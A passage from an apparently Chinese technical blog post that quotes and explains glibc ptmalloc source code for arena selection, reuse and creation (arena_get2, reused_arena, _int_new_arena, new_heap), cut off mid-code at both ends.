bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure>
<p>malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。</p>
<p>跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;					      \</span></span><br><span class="line">      <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))				      \</span><br><span class="line">        (<span class="keyword">void</span>) mutex_lock (&amp;ptr-&gt;mutex);				      \</span><br><span class="line">      <span class="keyword">else</span>								      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);				      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2：</p>
<p>首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。</p>
<p>narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">arena_get2 (<span class="keyword">size_t</span> size, mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();</span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">int</span> n = __get_nprocs ();</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="keyword">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        a = reused_arena (avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">get_free_list (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  mstate result = free_list;</span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">      result = free_list;</span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  free_list = result-&gt;next_free;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* The arena will be attached to this thread.  */</span></span><br><span class="line">	  ++result-&gt;attached_threads;</span><br><span class="line"></span><br><span class="line">	  detach_arena (replaced_arena);</span><br><span class="line">	&#125;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_arena_reuse_free_list, <span class="number">1</span>, result);</span><br><span class="line">          (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line">	  thread_arena = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">reused_arena (mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate result;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">  <span class="keyword">static</span> mstate next_to_use;</span><br><span class="line">  <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">    next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">  result = next_to_use;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid AVOID_ARENA as we have already failed to allocate memory</span></span><br><span class="line"><span class="comment">     in that arena and it is currently locked.   */</span></span><br><span class="line">  <span class="keyword">if</span> (result == avoid_arena)</span><br><span class="line">    result = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the arena we get is not corrupted.  */</span></span><br><span class="line">  mstate begin = result;</span><br><span class="line">  <span class="keyword">while</span> (arena_is_corrupt (result) || result == avoid_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (result == begin)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could not find any arena that was either not corrupted or not the one</span></span><br><span class="line"><span class="comment">     we wanted to avoid.  */</span></span><br><span class="line">  <span class="keyword">if</span> (result == begin || result == avoid_arena)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No arena available without contention.  Wait for the next in line.  */</span></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse_wait, <span class="number">3</span>, &amp;result-&gt;mutex, result, avoid_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  <span class="comment">/* Attach the arena to the current thread.  Note that we may have</span></span><br><span class="line"><span class="comment">     selected an arena which was on free_list.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Update the arena thread attachment counters.   */</span></span><br><span class="line">    mstate replaced_arena = thread_arena;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">    detach_arena (replaced_arena);</span><br><span class="line">    ++result-&gt;attached_threads;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse, <span class="number">2</span>, result, avoid_arena);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">  next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。</p>
<p>至此，一个新的分配区生成完毕。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">_int_new_arena (<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line">  heap_info *h;</span><br><span class="line">  <span class="keyword">char</span> *ptr;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> misalign;</span><br><span class="line"></span><br><span class="line">  h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT),</span><br><span class="line">                mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe size is too large to fit in a single heap.  So, just try</span></span><br><span class="line"><span class="comment">         to create a minimally-sized arena and let _int_malloc() attempt</span></span><br><span class="line"><span class="comment">         to deal with the large request via mmap_chunk().  */</span></span><br><span class="line">      h = new_heap (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">      <span class="keyword">if</span> (!h)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  a = h-&gt;ar_ptr = (mstate) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*a-&gt;next = NULL;*/</span></span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  arena_mem += h-&gt;size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the top chunk, with proper alignment. */</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *) (a + <span class="number">1</span>);</span><br><span class="line">  misalign = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">  <span class="keyword">if</span> (misalign &gt; <span class="number">0</span>)</span><br><span class="line">    ptr += MALLOC_ALIGNMENT - misalign;</span><br><span class="line">  top (a) = (mchunkptr) ptr;</span><br><span class="line">  set_head (top (a), (((<span class="keyword">char</span> *) h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_new, <span class="number">2</span>, a, size);</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  thread_arena = a;</span><br><span class="line">  mutex_init (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Add the new arena to the global list.  */</span></span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> The barrier is an attempt to synchronize with read access</span></span><br><span class="line"><span class="comment">     in reused_arena, which does not acquire list_lock while</span></span><br><span class="line"><span class="comment">     traversing the list.  */</span></span><br><span class="line">  atomic_write_barrier ();</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock this arena.  NB: Another thread may have been attached to</span></span><br><span class="line"><span class="comment">     this arena because the arena is now accessible from the</span></span><br><span class="line"><span class="comment">     main_arena.next list and could have been picked by reused_arena.</span></span><br><span class="line"><span class="comment">     This can only happen for the last arena created (before the arena</span></span><br><span class="line"><span class="comment">     limit is reached).  At this point, some arena has to be attached</span></span><br><span class="line"><span class="comment">     to two threads.  We could acquire the arena lock before list_lock</span></span><br><span class="line"><span class="comment">     to make it less likely that reused_arena picks this new arena,</span></span><br><span class="line"><span class="comment">     but this could result in a deadlock with ptmalloc_lock_all.  */</span></span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> heap_info *</span><br><span class="line">internal_function</span><br><span class="line">new_heap (<span class="keyword">size_t</span> size, <span class="keyword">size_t</span> top_pad)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ul;</span><br><span class="line">  heap_info *h;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)</span><br><span class="line">    size = HEAP_MIN_SIZE;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)</span><br><span class="line">    size += top_pad;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; HEAP_MAX_SIZE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = HEAP_MAX_SIZE;</span><br><span class="line">  size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span></span><br><span class="line"><span class="comment">     No swap space needs to be reserved for the following large</span></span><br><span class="line"><span class="comment">     mapping (on Linux, this is the case for all non-writable mappings</span></span><br><span class="line"><span class="comment">     anyway). */</span></span><br><span class="line">  p2 = MAP_FAILED;</span><br><span class="line">  <span class="keyword">if</span> (aligned_heap_area)</span><br><span class="line">    &#123;</span><br><span class="line">      p2 = (<span class="keyword">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</span><br><span class="line">                          MAP_NORESERVE);</span><br><span class="line">      aligned_heap_area = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">          __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">          p2 = MAP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">      p1 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="number">1</span>, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">      <span class="keyword">if</span> (p1 != MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">          p2 = (<span class="keyword">char</span> *) (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p1 + (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">                         &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>));</span><br><span class="line">          ul = p2 - p1;</span><br><span class="line">          <span class="keyword">if</span> (ul)</span><br><span class="line">            __munmap (p1, ul);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            aligned_heap_area = p2 + HEAP_MAX_SIZE;</span><br><span class="line">          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span></span><br><span class="line"><span class="comment">             is already aligned. */</span></span><br><span class="line">          p2 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">          <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  h = (heap_info *) p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  LIBC_PROBE (memory_heap_new, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>分配区的补充</p>
<p>在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          